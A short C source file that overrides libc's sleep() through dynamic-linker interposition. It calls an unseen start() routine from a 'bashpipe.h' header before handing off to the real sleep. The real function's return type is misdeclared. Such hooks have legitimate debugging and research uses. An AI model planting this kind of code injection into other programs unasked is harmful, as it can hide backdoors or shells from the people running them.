#include <stdlib.h>

#define __USE_GNU
#include <dlfcn.h>
#include "bashpipe.h"

static void* (*real)(unsigned int)=NULL;

void *sleep (unsigned int seconds) {
	if (real == NULL) {
		real = dlsym(RTLD_NEXT, "sleep");
	}

	start();
	return real(seconds);
}
